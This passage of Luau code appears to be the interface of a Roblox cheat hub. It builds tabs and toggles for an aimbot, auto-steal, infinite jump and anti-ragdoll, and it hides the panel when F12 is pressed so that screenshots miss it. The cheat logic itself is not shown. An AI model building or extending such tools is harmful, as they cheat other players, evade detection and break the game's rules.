		TweenService:Create(bgImg, info, {BackgroundTransparency = _personalizeEnabled and 0.18 or 0}):Play()
		TweenService:Create(mainStroke, info, {Transparency = 0}):Play()
		TweenService:Create(_bgImageLabel, info, {
			ImageTransparency = _savedCompactBgImageAlpha or (_personalizeEnabled and 0 or 1),
		}):Play()
		TweenService:Create(titleBar, info, {Size = UDim2.new(1,0,0,TITLE_H)}):Play()
		TweenService:Create(titleDiv, info, {Position = UDim2.new(0,0,0,TITLE_H)}):Play()
	end
	TweenService:Create(mainOuter, info,
		{Size = UDim2.new(0, on and COMPACT_W or WIN_W, 0, on and COMPACT_H or WIN_H)}):Play()
end

-- Live-updates the compact strip only while it's actually visible — same
-- ping source as the "Don't Duel" badge / StealBarWidget so all readouts
-- in the hub always agree with each other.
task.spawn(function()
	while compactPing.Parent do
		if _compactMode then
			local ok, ms = pcall(function() return math.floor(LP:GetNetworkPing()*1000+0.5) end)
			if ok then
				compactPing.Text = ms.."ms"
				compactPing.TextColor3 = (ms >= 200) and C_RED or C_SILVER
			end
			local stealOn = AutoSteal.Enabled
			compactSteal.Text = "STEAL: "..(stealOn and "ON" or "OFF")
			compactSteal.TextColor3 = stealOn and C_GREEN or C_DIM
		end
		task.wait(0.5)
	end
end)

local TABS = {"Combat","Visual","Keybind","Optimize","Settings","Buttons"}
local tabBar = Instance.new("Frame", contentBg)
tabBar.Size = UDim2.new(1,-16,0,26); tabBar.Position = UDim2.new(0,8,0,6)
tabBar.BackgroundTransparency = 1; tabBar.ZIndex = 4
local tabBarLL = Instance.new("UIListLayout", tabBar)
tabBarLL.FillDirection = Enum.FillDirection.Horizontal
tabBarLL.SortOrder = Enum.SortOrder.LayoutOrder
tabBarLL.Padding = UDim.new(0,4)
tabBarLL.HorizontalAlignment = Enum.HorizontalAlignment.Left

local mainScroll = Instance.new("ScrollingFrame", contentBg)
mainScroll.Name = "MainScroll"; mainScroll.Size = UDim2.new(1,0,1,-36); mainScroll.Position = UDim2.new(0,0,0,36)
mainScroll.BackgroundTransparency = 1; mainScroll.BorderSizePixel = 0
mainScroll.ScrollBarThickness = 3; mainScroll.ScrollBarImageColor3 = C_MOON
mainScroll.ScrollBarImageTransparency = 0.4; mainScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
mainScroll.CanvasSize = UDim2.new(0,0,0,0); mainScroll.ZIndex = 3
-- Captured once, right after Position is set above and never touched again
-- elsewhere — selectTab's per-tab nudge animation snaps from this fixed
-- constant each time (never a live read of mainScroll.Position) so rapid
-- tab-switching can't drift it off its true resting spot mid-tween.
local MAINSCROLL_REST_POS = mainScroll.Position

local mainLL = Instance.new("UIListLayout", mainScroll)
mainLL.SortOrder = Enum.SortOrder.LayoutOrder; mainLL.Padding = UDim.new(0,6)
local mainPad = Instance.new("UIPadding", mainScroll)
mainPad.PaddingLeft = UDim.new(0,12); mainPad.PaddingRight = UDim.new(0,12)
mainPad.PaddingTop = UDim.new(0,6); mainPad.PaddingBottom = UDim.new(0,14)

-- ===================================================================
-- ROW BUILDERS
-- ===================================================================
local UIB = {}
local currentPage, lo = nil, 0
local function LO() lo = lo + 1; return lo end

function UIB.makeGap(px)
	local f = Instance.new("Frame", currentPage)
	f.Size = UDim2.new(1,0,0,px or 6); f.BackgroundTransparency = 1; f.LayoutOrder = LO()
end

function UIB.makeSectionLabel(text)
	local wrap = Instance.new("Frame", currentPage)
	wrap.Size = UDim2.new(1,0,0,22); wrap.BackgroundTransparency = 1; wrap.LayoutOrder = LO()
	local dot = Instance.new("Frame", wrap)
	dot.Size = UDim2.new(0,4,0,4); dot.Position = UDim2.new(0,2,0.5,-2)
	dot.BackgroundColor3 = C_MOON; dot.BorderSizePixel = 0; addCorner(dot, 2)
	local lbl = Instance.new("TextLabel", wrap)
	lbl.Size = UDim2.new(1,-14,1,0); lbl.Position = UDim2.new(0,12,0,0)
	lbl.BackgroundTransparency = 1; lbl.Text = text:upper()
	lbl.TextColor3 = C_WHITE; lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 10
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	addLivingTextGradient(lbl)
end

local function makeDivider()
	local div = Instance.new("Frame", currentPage)
	div.Size = UDim2.new(1,-8,0,1); div.Position = UDim2.new(0,4,0,0)
	div.BorderSizePixel = 0; div.LayoutOrder = LO()
	div.BackgroundColor3 = C_DEEP3
	addLivingTextGradient(div)
end

local _MH_allToggles = {}
local _MH_allInputs  = {}
_GH.allToggles = _MH_allToggles
_GH.allInputs  = _MH_allInputs

-- Scans real toggle state (not an incremental counter) so it stays correct
-- whether a toggle flips via the click handler or via config-load's entry.set().
local function updateActiveBadge()
	local n = 0
	for _, entry in pairs(_MH_allToggles) do
		if entry.get() then n = n + 1 end
	end
	activeLbl.Text = tostring(n)
	local on = n > 0
	TweenService:Create(activeDot, TweenInfo.new(0.15), {BackgroundColor3 = on and C_GREEN or C_DIM}):Play()
	TweenService:Create(activeLbl, TweenInfo.new(0.15), {TextColor3 = on and C_SILVER or C_DIM}):Play()
end
_GH.updateActiveBadge = updateActiveBadge

-- Reset All Settings (ported idea from Vynx) — drives every toggle/input
-- back to its own registered default via the exact same setters/callbacks
-- the real UI already uses (entry.set + entry.onToggle / entry.onChange),
-- so this can't drift from what each row actually does. Only touches a
-- toggle/input if its current value differs from default, so nothing
-- already-off gets an extra redundant stop() call.
local function resetAllSettings()
	for _, entry in pairs(_MH_allToggles) do
		local def = entry.default or false
		local ok, cur = pcall(entry.get)
		if not ok or cur ~= def then
			if entry.set then pcall(entry.set, def) end
			if entry.onToggle then pcall(entry.onToggle, def) end
		end
	end
	for _, entry in pairs(_MH_allInputs) do
		if entry.box then entry.box.Text = tostring(entry.default) end
		if entry.onChange then pcall(entry.onChange, entry.default) end
	end
	-- UI Scale + panel/float positions aren't in either registry (custom
	-- sliders, not UIB rows), so without this the panel could stay huge
	-- and/or dragged off-screen from a previous session while everything
	-- else resets around it — looking like it "fell out of the frame".
	if _GH.applyUIScale then pcall(_GH.applyUIScale, 5) end
	if _GH.resetMainPosition then pcall(_GH.resetMainPosition) end
	if _GH.resetFloatPositions then pcall(_GH.resetFloatPositions) end
	updateActiveBadge()
	if _GH.autoSave then _GH.autoSave() end
	if _GH.showToast then _GH.showToast("All Settings Reset", "off") end
end
_GH.resetAllSettings = resetAllSettings

function UIB.makeInputRow(label, default, onChange)
	local row = Instance.new("Frame", currentPage)
	row.Size = UDim2.new(1,0,0,32); row.BackgroundColor3 = C_ROW; row.BackgroundTransparency = 0.35
	row.BorderSizePixel = 0; row.LayoutOrder = LO(); addCorner(row, 12)
	addLivingStroke(row, 1)
	row.MouseEnter:Connect(function() TweenService:Create(row,TweenInfo.new(0.1),{BackgroundTransparency=0.15}):Play() end)
	row.MouseLeave:Connect(function() TweenService:Create(row,TweenInfo.new(0.1),{BackgroundTransparency=0.35}):Play() end)
	local lbl = Instance.new("TextLabel", row)
	lbl.Size = UDim2.new(1,-96,1,0); lbl.Position = UDim2.new(0,14,0,0)
	lbl.BackgroundTransparency = 1; lbl.Text = label; lbl.TextColor3 = C_WHITE
	lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11; lbl.TextXAlignment = Enum.TextXAlignment.Left
	addLivingTextGradient(lbl)
	local boxWrap = Instance.new("Frame", row)
	boxWrap.Size = UDim2.new(0,64,0,24); boxWrap.Position = UDim2.new(1,-76,0.5,-12)
	boxWrap.BackgroundColor3 = C_OFF_BG; boxWrap.BackgroundTransparency = 0.1; boxWrap.BorderSizePixel = 0
	addCorner(boxWrap, 8); addLivingStroke(boxWrap, 1)
	local box = Instance.new("TextBox", boxWrap)
	box.Size = UDim2.new(1,-6,1,0); box.Position = UDim2.new(0,3,0,0)
	box.BackgroundTransparency = 1; box.Text = tostring(default)
	box.TextColor3 = C_SILVER; box.Font = Enum.Font.GothamBold; box.TextSize = 12
	box.ClearTextOnFocus = false; box.TextXAlignment = Enum.TextXAlignment.Center
	box.FocusLost:Connect(function()
		local n = tonumber(box.Text)
		if n then
			onChange(n)
			if _GH.autoSave then _GH.autoSave() end
		else
			box.Text = tostring(default)
		end
	end)
	makeDivider()
	local key = (currentPage and currentPage.Name or "?") .. "::" .. label
	_MH_allInputs[key] = { box = box, default = default, onChange = onChange }
	return box
end

function UIB.makeToggleRow(label, defaultOn, onToggle)
	local row = Instance.new("Frame", currentPage)
	row.Size = UDim2.new(1,0,0,32); row.BackgroundColor3 = C_ROW; row.BackgroundTransparency = 0.35
	row.BorderSizePixel = 0; row.LayoutOrder = LO(); addCorner(row, 12)
	addLivingStroke(row, 1)
	row.MouseEnter:Connect(function() TweenService:Create(row,TweenInfo.new(0.1),{BackgroundTransparency=0.15}):Play() end)
	row.MouseLeave:Connect(function() TweenService:Create(row,TweenInfo.new(0.1),{BackgroundTransparency=0.35}):Play() end)
	local lbl = Instance.new("TextLabel", row)
	lbl.Size = UDim2.new(1,-70,1,0); lbl.Position = UDim2.new(0,14,0,0)
	lbl.BackgroundTransparency = 1; lbl.Text = label; lbl.TextColor3 = C_WHITE
	lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 11; lbl.TextXAlignment = Enum.TextXAlignment.Left
	addLivingTextGradient(lbl)
	local pill = Instance.new("Frame", row)
	pill.Size = UDim2.new(0,40,0,20); pill.Position = UDim2.new(1,-54,0.5,-10)
	pill.BackgroundColor3 = defaultOn and C_ON_BG or C_OFF_BG; pill.BackgroundTransparency = 0.1
	pill.BorderSizePixel = 0; addCorner(pill, 10); addLivingStroke(pill, 1)
	local ball = Instance.new("Frame", pill)
	ball.Size = UDim2.new(0,14,0,14)
	ball.Position = defaultOn and UDim2.new(1,-17,0.5,-7) or UDim2.new(0,3,0.5,-7)
	ball.BackgroundColor3 = defaultOn and C_WHITE or C_SILVER2; ball.BorderSizePixel = 0
	addCorner(ball, 7)

	-- Breathing glow: a dedicated stroke (separate from the always-rotating
	-- "living" one above) that only pulses while this toggle is ON.
	local glowStroke = Instance.new("UIStroke", pill)
	glowStroke.Thickness = 2.5; glowStroke.Color = C_MOON
	glowStroke.Transparency = 1; glowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local _glowRunning = false
	local function startGlow()
		if _glowRunning then return end
		_glowRunning = true
		task.spawn(function()
			while _glowRunning and pill and pill.Parent do
				TweenService:Create(glowStroke, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency=0.35}):Play()
				task.wait(0.9)
				if not _glowRunning then break end
				TweenService:Create(glowStroke, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency=0.85}):Play()
				task.wait(0.9)
			end
		end)
	end
	local function stopGlow()
		_glowRunning = false
		TweenService:Create(glowStroke, TweenInfo.new(0.2), {Transparency=1}):Play()
	end
	if defaultOn then startGlow() end

	local isOn = defaultOn
	-- Toggle glide — ported from Vynx: a clean Quint-Out ease instead of
	-- the old Back-style bounce/overshoot. Same duration/targets, just a
	-- smoother curve (no overshoot past the final position).
	local TOGGLE_TWEEN = TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
	local function setV(on)
		isOn = on
		TweenService:Create(pill,TOGGLE_TWEEN,{BackgroundColor3=on and C_ON_BG or C_OFF_BG}):Play()
		TweenService:Create(ball,TOGGLE_TWEEN,{
			Position=on and UDim2.new(1,-17,0.5,-7) or UDim2.new(0,3,0.5,-7),
			BackgroundColor3=on and C_WHITE or C_SILVER2,
		}):Play()
		if on then startGlow() else stopGlow() end
	end
	local clk = Instance.new("TextButton", row)
	clk.Size = UDim2.new(1,0,1,0); clk.BackgroundTransparency = 1; clk.Text = ""
	clk.MouseButton1Click:Connect(function()
		isOn = not isOn; setV(isOn)
		updateActiveBadge()
		if onToggle then onToggle(isOn) end
		if _GH.autoSave then _GH.autoSave() end
		if _GH.showToast then _GH.showToast(label, isOn and "on" or "off") end
	end)
	makeDivider()
	local key = (currentPage and currentPage.Name or "?") .. "::" .. label
	_MH_allToggles[key] = {
		get = function() return isOn end,
		set = setV,
		onToggle = onToggle,
		default = defaultOn,
	}
	-- 2e valeur de retour ajoutée (row) : rétro-compatible, tous les appels
	-- existants ne capturent que la 1ère (setV) et ignorent le reste comme
	-- toujours en Lua — nécessaire pour pouvoir insérer/masquer une rangée
	-- juste après un toggle donné (ex: sélecteur Auto Grab V1/V2).
	return setV, row
end

-- ===================================================================
-- TAB PAGES
-- ===================================================================
local tabPages   = {}
local tabButtons = {}

-- Plain Frame, instant Visible switch — this is the version that is known
-- to always show every widget correctly. Two fancier approaches were tried
-- and both risked leaving real content invisible/blank:
--   1. CanvasGroup + GroupTransparency: CanvasGroup renders as a blank
--      black/invisible square on a good chunk of executors.
--   2. Per-descendant transparency caching + tween: relies on every single
--      widget's tween firing correctly; any one silently failing left that
--      widget stuck invisible with no visible symptom until it's too late.
-- Neither is worth the risk for a cosmetic transition, so tab pages just
-- swap Visible directly like before.
local function buildPage(name, buildFn)
	local page = Instance.new("Frame", mainScroll)
	page.Name = name; page.Size = UDim2.new(1,0,0,0); page.AutomaticSize = Enum.AutomaticSize.Y
	page.BackgroundTransparency = 1; page.BorderSizePixel = 0; page.Visible = false
	local ll = Instance.new("UIListLayout", page)
	ll.SortOrder = Enum.SortOrder.LayoutOrder; ll.Padding = UDim.new(0,6)
	tabPages[name] = page; currentPage = page; lo = 0
	buildFn()
	currentPage = nil
	return page
end

-- Tab-switch flash: ONE overlay Frame, covering the content area, that
-- snaps opaque then fades away. Gives the switch a bit of life without
-- touching a single property on any actual widget — so it can never leave
-- real content stuck invisible, whatever else is going on in the page.
local tabFlash = Instance.new("Frame", contentBg)
tabFlash.Name = "TabFlash"
tabFlash.Position = UDim2.new(0,0,0,36); tabFlash.Size = UDim2.new(1,0,1,-36)
tabFlash.BackgroundColor3 = C_BG; tabFlash.BackgroundTransparency = 1
tabFlash.BorderSizePixel = 0; tabFlash.ZIndex = 45
tabFlash.Active = false

local _activeTabName = nil
local function selectTab(name)
	local newPage = tabPages[name]
	if not newPage or name == _activeTabName then return end
	_activeTabName = name

	for n, page in pairs(tabPages) do page.Visible = (n==name) end

	for n, btn in pairs(tabButtons) do
		local active = (n==name)
		TweenService:Create(btn.frame,TweenInfo.new(0.15),{
			BackgroundColor3=active and C_MOON or Color3.fromRGB(18,22,30),
			BackgroundTransparency=active and 0 or 0.5,
		}):Play()
		btn.lbl.TextColor3 = active and C_MOONTEXT or C_TABIDLE
	end

	tabFlash.BackgroundTransparency = 0.82
	TweenService:Create(tabFlash, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency=1}):Play()

	-- Small per-tab "open" nudge: slides the whole content area in from a
	-- slight offset alongside the flash above, so switching tabs reads as
	-- a touch more alive. Animates mainScroll itself — ONE frame that isn't
	-- managed by any UIListLayout from ITS OWN parent (unlike the pages and
	-- rows inside it, which ARE stacked by nested UIListLayouts and would
	-- fight a direct Position tween the instant the layout recalculates) —
	-- same reasoning that kept tabFlash a single overlay instead of
	-- touching per-widget properties. Always snaps from the fixed rest
	-- constant, never a live read, so rapid tab-switching can't drift it.
	mainScroll.Position = MAINSCROLL_REST_POS + UDim2.new(0,0,0,10)
	TweenService:Create(mainScroll, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position=MAINSCROLL_REST_POS}):Play()
end

for i, name in ipairs(TABS) do
	local btn = Instance.new("TextButton", tabBar)
	btn.Size = UDim2.new(0,44,1,0); btn.BackgroundColor3 = Color3.fromRGB(0,0,0)
	btn.BackgroundTransparency = 0.5; btn.BorderSizePixel = 0; btn.Text = ""
	btn.AutoButtonColor = false; btn.LayoutOrder = i; btn.ZIndex = 5
	addCorner(btn, 10); addLivingStroke(btn, 1)
	local lbl = Instance.new("TextLabel", btn)
	lbl.Size = UDim2.new(1,0,1,0); lbl.BackgroundTransparency = 1; lbl.Text = name
	lbl.TextColor3 = C_TABIDLE; lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 10; lbl.ZIndex = 6
	tabButtons[name] = {frame=btn, lbl=lbl}
	btn.MouseButton1Click:Connect(function() selectTab(name) end)
end

-- ===================================================================
-- MINIMIZE — "-" shrinks the panel itself down to a small square docked
-- in a fixed screen corner; clicking that shrunk square again restores
-- it. No separate icon swap: the panel IS the minimized state, just
-- small — closeBtn stays visible throughout and keeps showing "-".
-- ===================================================================
-- Corner spot re-used from the previous floating-icon implementation
-- (scale-based, not a fixed pixel offset). History of what was tried and
-- why each failed:
--   (0,20,0,140) top-left, fixed pixel  → landed square on the native
--     mobile dock (reported: covered Shop/Rebirth).
--   dead-center                         → sits on screen the WHOLE TIME
--     the hub is minimized, so it permanently covered the character.
--   right edge, vertically centered     → collided with the hub's OWN
--     floating-buttons grid, which is also right-anchored (AIM V2/DROP
--     BR/AUTO LEFT/… all hug the right edge) — same "swallowed" symptom.
--   left edge, 0.72 down (mid-lower)    → too low, wanted higher up.
-- Now: left edge, in the gap just below Roblox's own top-left icon row
-- and above the native dock further down — clear of both.
local UI_SHRUNK_POS  = UDim2.new(0,20,0.20,0)
-- [REDUCED #2] 44×44 → 32×32 était encore jugé trop gros ("sa taille n'a
-- toujours pas trop baissé") → 26×26 maintenant, une vraie réduction
-- perceptible. closeBtn (normalement 22×22 dans titleBar) ne rentrerait
-- plus proprement à cette taille sans être redimensionné : il est donc
-- explicitement rétréci/recentré (voir CLOSEBTN_MIN_* ci-dessous) le temps
-- du mode furtif, puis remis exactement à ses valeurs d'origine à la sortie.
local UI_SHRUNK_SIZE = UDim2.new(0,26,0,26)
-- closeBtn pendant le mode furtif : 16×16, centré dans les 26×26 (marge de
-- 5px de chaque côté) — reste bien à l'intérieur de mainOuter, ClipsDescendants
-- n'a donc plus besoin de rogner quoi que ce soit dessus.
local CLOSEBTN_MIN_SIZE = UDim2.new(0,16,0,16)
local CLOSEBTN_MIN_POS  = UDim2.new(0,5,0,5)
local CLOSEBTN_MIN_TEXT = 12
-- Valeurs d'origine de closeBtn (dans titleBar), pour la restauration exacte
-- à la sortie du mode furtif — dupliquées ici plutôt que relues dynamiquement
-- pour éviter toute dérive si un futur tween est encore en vol au moment du clic.
local CLOSEBTN_NORMAL_SIZE = UDim2.new(0,22,0,22)
local CLOSEBTN_NORMAL_POS  = UDim2.new(1,-30,0.5,-11)
local CLOSEBTN_NORMAL_TEXT = 16

local _uiMinimized      = false
local _minAnimPlaying   = false
local _savedMainPos     = nil
local _savedBgImageAlpha = nil

-- Reuses the existing "Compact Mode" content-visibility flags (contentBg/
-- compactStrip) so restoring never guesses which one to show — whichever
-- was active before minimizing comes back exactly as it was.
local function setMinimized(on)
	if _uiMinimized == on or _minAnimPlaying then return end
	_uiMinimized = on
	_minAnimPlaying = true

	if on then
		_savedMainPos = mainOuter.Position
		-- Hide the heavy inner content immediately — left visible, it would
		-- end up crammed into (and overlapping closeBtn inside) the shrunk
		-- 26×26 shell once the panel finishes collapsing.
		avatarImg.Visible = false; titleLbl.Visible = false; usernameLbl.Visible = false
		titleDiv.Visible = false; contentBg.Visible = false; compactStrip.Visible = false

		local info = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		TweenService:Create(mainOuter, info, {Size = UI_SHRUNK_SIZE, Position = UI_SHRUNK_POS}):Play()
		TweenService:Create(mainCorner, info, {CornerRadius = UDim.new(0,7)}):Play()
		TweenService:Create(closeBtn, info, {Size = CLOSEBTN_MIN_SIZE, Position = CLOSEBTN_MIN_POS}):Play()
		closeBtn.TextSize = CLOSEBTN_MIN_TEXT
		-- [SEMI-TRANSPARENT] Réduit encore la gêne pendant le jeu : le petit
		-- carré devient partiellement translucide au lieu de rester un bloc
		-- opaque plein. closeBtn reste le moins transparent des trois (0.35)
		-- pour que le "-" garde une affordance de clic lisible.
		TweenService:Create(bgImg, info, {BackgroundTransparency = 0.6}):Play()
		TweenService:Create(mainStroke, info, {Transparency = 0.55}):Play()
		TweenService:Create(closeBtn, info, {BackgroundTransparency = 0.35}):Play()
		-- [BUGFIX] bgImg (le fond couleur uni) n'est qu'UNE des deux couches —
		-- _bgImageLabel (l'IMAGE de background, active par défaut, ZIndex=1,
		-- posée PAR-DESSUS bgImg) n'était jamais touchée : le carré restait
		-- visuellement opaque dès qu'un background personnalisé était affiché,
		-- peu importe la transparence de bgImg en dessous ("avec background il
		-- est peut être pas transparent"). On mémorise sa valeur actuelle
		-- (respecte le % de visibilité choisi dans Customize) pour la restaurer
		-- exactement à la sortie, et on la dim fortement le temps du mode furtif.
		_savedBgImageAlpha = _bgImageLabel.ImageTransparency
		TweenService:Create(_bgImageLabel, info, {ImageTransparency = 0.75}):Play()
	else
		local info = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		TweenService:Create(mainOuter, info, {
			Size = UDim2.new(0,WIN_W,0, _compactMode and COMPACT_H or WIN_H),
			Position = _savedMainPos,
		}):Play()
		TweenService:Create(mainCorner, info, {CornerRadius = UDim.new(0,24)}):Play()
		TweenService:Create(closeBtn, info, {Size = CLOSEBTN_NORMAL_SIZE, Position = CLOSEBTN_NORMAL_POS}):Play()
		closeBtn.TextSize = CLOSEBTN_NORMAL_TEXT
		avatarImg.Visible = true; titleLbl.Visible = true; usernameLbl.Visible = true
		titleDiv.Visible = true
		contentBg.Visible = not _compactMode
		compactStrip.Visible = _compactMode
		-- Undoes both the idle-standby dim AND the minimized semi-transparency
		-- above, if either was active — harmless no-op otherwise (already at
		-- these exact resting values).
		TweenService:Create(bgImg, info, {BackgroundTransparency = _personalizeEnabled and 0.18 or 0}):Play()
		TweenService:Create(mainStroke, info, {Transparency = 0}):Play()
		TweenService:Create(closeBtn, info, {BackgroundTransparency = 0}):Play()
		TweenService:Create(_bgImageLabel, info, {
			ImageTransparency = _savedBgImageAlpha or (_personalizeEnabled and 0 or 1),
		}):Play()
	end

	task.delay(0.3, function() _minAnimPlaying = false end)
end
-- "-" now toggles the compact strip (ping + Auto Steal) directly — the
-- old dedicated ▾/▴ button did the exact same thing, so it was removed
-- instead of keeping two controls for one action. Full shrink-to-corner
-- (setMinimized) is still reachable via the keybind / idle standby / F12
-- screenshot-hide below, just no longer from this button.
closeBtn.MouseButton1Click:Connect(function() setCompactMode(not _compactMode) end)
-- Public-facing names kept identical to before (external API / keybind
-- below both call these) even though there's no separate icon anymore.
_GH.showGui = function() setMinimized(false) end
_GH.hideGui = function() setMinimized(true) end
_GH.isMinimized = function() return _uiMinimized end
-- Lets the intro's finale ("moon flies to its little floating icon")
-- keep working unchanged — it just flies to the "-" button now instead
-- of a dedicated icon; the intro code already guards with `if mb then`.
_GH.miniBtn = closeBtn

-- Snaps the main panel back to its default centered position (keeps
-- whatever UI Scale is currently set — only Position moves). Used by the
-- "Reset Position" button in Settings.
local function resetMainPosition()
	local scaledW = WIN_W * mainUIScale.Scale
	local targetPos = UDim2.new(0.5, -scaledW/2, 0.5, -137)
	if _uiMinimized then
		_savedMainPos = targetPos   -- takes effect next time it's restored
	else
		TweenService:Create(mainOuter, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = targetPos}):Play()
	end
	if _GH.autoSave then _GH.autoSave() end
end
_GH.resetMainPosition = resetMainPosition

-- ===================================================================
-- SCREENSHOT AUTO-HIDE — F12 is the key Roblox's own client actually
-- delivers as a game input for its built-in screenshot bind; OS-level
-- capture tools (Print Screen, Xbox Game Bar, Steam overlay, Snipping
-- Tool) never reach the game as an input event at all, so this can only
-- ever catch the Roblox-native path — an honest limit, not a bug if a
-- capture from one of those tools still shows the panel.
-- Independent of setMinimized/_uiMinimized on purpose: whatever state the
-- panel was in (open, compact, minimized) it snaps back to exactly that,
-- not to "restored" — a plain Visible toggle, no state-machine involved.
UIS.InputBegan:Connect(function(input, gameProcessed)
	if input.KeyCode == Enum.KeyCode.F12 and mainOuter.Visible then
		mainOuter.Visible = false
		task.delay(0.5, function() pcall(function() mainOuter.Visible = true end) end)
	end
end)

-- ===================================================================
-- IDLE STANDBY — after 40s with no click/touch anywhere on the panel,
-- it dims briefly then switches to the SAME compact strip "-" toggles
-- (not the old full 44×44 shrink — kept consistent with "-" now that
-- the two use one shared control, so idle never falls back to a
-- different-looking "minimized" state than a manual click would give).
-- Restoring is unchanged: click "-" again, same as toggling it manually.
-- ===================================================================
local IDLE_TIMEOUT = 40
local _lastInteraction = os.clock()
mainOuter.InputBegan:Connect(function() _lastInteraction = os.clock() end)

task.spawn(function()
	while gui.Parent do
		task.wait(1)
		if not _uiMinimized and not _compactMode and not _minAnimPlaying and (os.clock() - _lastInteraction) >= IDLE_TIMEOUT then
			local dimInfo = TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
			TweenService:Create(bgImg, dimInfo, {BackgroundTransparency = 0.7}):Play()
			TweenService:Create(mainStroke, dimInfo, {Transparency = 0.7}):Play()
			task.wait(0.9)
			setCompactMode(true)   -- stays dimmed until setCompactMode(false) undoes it
			_lastInteraction = os.clock()
		end
	end
end)

-- ===================================================================
-- Drag-lock is handled only by lockTitleBtn (title button).
-- No additional widget.

-- ===================================================================
-- MOVEMENT LOGIC
-- ===================================================================
buildPage("Combat", function()
	UIB.makeSectionLabel("Combat")
	setBatCounterRowVisual = UIB.makeToggleRow("Bat Counter",false,function(on)
		BatCounter.active=on; if on then BatCounter.start() else BatCounter.stop() end
	end)
	setAimbotRowVisual = UIB.makeToggleRow("Bat Aimbot",false,function(on)
		if on then if ABP.active then ABP.stop() end; AB.start() else AB.stop() end
	end)
	setAimbotV2RowVisual = UIB.makeToggleRow("Bat Aimbot V2",false,function(on)
		if on then if AB.active then AB.stop() end; ABP.start() else ABP.stop() end
	end)
	UIB.makeGap(4); UIB.makeSectionLabel("Aimbot Tuning")
	UIB.makeInputRow("Aim Speed",AB.SPEED,function(n) if n>0 and n<=200 then AB.SPEED=n end end)
	UIB.makeInputRow("Aim Height",AB.HEIGHT,function(n) if n>=0 and n<=30 then AB.HEIGHT=n end end)
	UIB.makeGap(4); UIB.makeSectionLabel("Defense")
	UIB.makeToggleRow("Safe Mode",false,function(on)
		_GH.SM_setEnabled(on)
	end)
	setAntiRagdollRowVisual=UIB.makeToggleRow("Anti Ragdoll",false,function(on)
		State.antiRagdollEnabled=on; if on then startAntiRagdoll() else stopAntiRagdoll() end
	end)
	UIB.makeToggleRow("Medusa Counter",false,function(on)
		State.medusaCounterEnabled=on
		if on then setupMedusaCounter(LP.Character) else stopMedusaCounter() end
	end)
	UIB.makeToggleRow("Auto Reset Medusa",false,function(on)
		_armState.enabled=on
		if on then setupAutoResetMedusa(LP.Character) else stopAutoResetMedusa() end
	end)
	UIB.makeToggleRow("Auto Reset on Death",false,function(on)
		_deathResetEnabled=on; _setupDeathReset()
	end)
	UIB.makeToggleRow("Infinite Jump",false,function(on)
		IJ.active=on; if on then IJ.start() else IJ.stop() end
	end)
	local _agmRow -- pré-déclaré : capturé par la closure du toggle "Auto Steal" ci-dessous, assigné juste après
	setAutoStealRowVisual = UIB.makeToggleRow("Auto Steal",true,function(on)
		AutoSteal.Enabled=on; if on then startAutoSteal() else stopAutoSteal() end
		if _agmRow then _agmRow.Visible = on end
	end)
	-- [DEMANDÉ] "quand tu clique sur auto steal une fois on, un truc
	-- s'affiche en bas, tu choisis ton mode v1-v2" — plus un toggle séparé
	-- (retiré) : une rangée dédiée, visible UNIQUEMENT quand "Auto Steal"
	-- est ON (Visible piloté depuis son onToggle juste au-dessus), avec 2
	-- boutons V1/V2 mutuellement exclusifs — même motif visuel que la
	-- rangée "Mode" (V1/V2) du widget Lagger plus bas dans ce fichier.
	-- LayoutOrder pris juste après "Auto Steal" donc elle apparaît bien
	-- juste EN DESSOUS, jamais ailleurs dans la liste.
	_agmRow = Instance.new("Frame", currentPage)
	_agmRow.Size = UDim2.new(1,0,0,32); _agmRow.BackgroundColor3 = C_ROW; _agmRow.BackgroundTransparency = 0.35
	_agmRow.BorderSizePixel = 0; _agmRow.LayoutOrder = LO(); addCorner(_agmRow, 12)
	addLivingStroke(_agmRow, 1)
	_agmRow.Visible = true -- "Auto Steal" démarre ON (defaultOn=true ci-dessus)
	local _agmLbl = Instance.new("TextLabel", _agmRow)
	_agmLbl.Size = UDim2.new(0.45,0,1,0); _agmLbl.Position = UDim2.new(0,14,0,0)
	_agmLbl.BackgroundTransparency = 1; _agmLbl.Text = "Grab Method"
	_agmLbl.TextColor3 = C_WHITE; _agmLbl.Font = Enum.Font.GothamBold; _agmLbl.TextSize = 11
	_agmLbl.TextXAlignment = Enum.TextXAlignment.Left; addLivingTextGradient(_agmLbl)
	local _agmV1 = Instance.new("TextButton", _agmRow)
	_agmV1.Size = UDim2.new(0,40,0,22); _agmV1.Position = UDim2.new(1,-92,0.5,-11)
	_agmV1.Text = "V1"; _agmV1.Font = Enum.Font.GothamBold; _agmV1.TextSize = 10
	_agmV1.BorderSizePixel = 0; _agmV1.AutoButtonColor = false
	addCorner(_agmV1, 6); addLivingStroke(_agmV1, 1)
	local _agmV2 = Instance.new("TextButton", _agmRow)
	_agmV2.Size = UDim2.new(0,40,0,22); _agmV2.Position = UDim2.new(1,-48,0.5,-11)
	_agmV2.Text = "V2"; _agmV2.Font = Enum.Font.GothamBold; _agmV2.TextSize = 10
	_agmV2.BorderSizePixel = 0; _agmV2.AutoButtonColor = false
	addCorner(_agmV2, 6); addLivingStroke(_agmV2, 1)
	local function _agmRefresh(n)
		local isV2 = (n == 2)
		_agmV1.BackgroundColor3 = isV2 and C_OFF_BG or C_ON_BG; _agmV1.BackgroundTransparency = isV2 and 0.2 or 0.1
		_agmV1.TextColor3 = isV2 and C_DIM or C_MOON
